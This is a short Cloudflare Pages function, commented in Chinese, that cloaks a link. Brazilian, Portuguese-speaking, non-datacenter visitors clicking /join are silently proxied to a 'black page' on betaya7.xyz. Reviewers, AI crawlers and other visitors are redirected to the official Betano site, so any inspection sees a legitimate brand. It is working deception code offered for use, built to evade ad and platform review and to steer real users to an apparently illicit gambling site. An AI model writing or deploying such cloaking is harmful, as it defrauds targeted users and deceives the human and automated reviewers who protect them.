export async function onRequest(context) {
  const { request } = context;
  const cf = request.cf;
  const url = new URL(request.url);
  const acceptLang = (request.headers.get("accept-language") || "").toLowerCase();

  // === 核心配置 ===
  const BLACK_SITE_URL = "https://betaya7.xyz/?ch=130015"; // 黑页：真实目标
  const WHITE_OFFICIAL_URL = "https://www.betano.bet.br/"; // 白页：官方承载页
  
  // === 判定逻辑 ===
  const isBR = cf.country === "BR";
  const isPT = acceptLang.includes("pt");
  const asnOrg = (cf.asOrganization || "").toLowerCase();
  const isDataCenter = /google|amazon|microsoft|facebook|akamai|cloudflare|linode|digitalocean|vultr|ovh|m247/i.test(asnOrg);

  const isTargetUser = isBR && isPT && !isDataCenter;
  const isClickAction = url.pathname === "/join";

  // === 分流执行 ===

  // 1. 巴西真用户点击 -> 后端静默代理黑页 (地址栏不变)
  if (isTargetUser && isClickAction) {
    const response = await fetch(BLACK_SITE_URL, {
      headers: { "User-Agent": request.headers.get("User-Agent") }
    });
    return new Response(response.body, {
      headers: { "content-type": "text/html;charset=UTF-8" }
    });
  }

  // 2. 审核员/AI/非目标用户点击 -> 物理重定向至官方白页
  if (isClickAction) {
    return Response.redirect(WHITE_OFFICIAL_URL, 302);
  }

  // 3. 默认访问 -> 展示 GitHub 上的 index.html
  return context.next();
}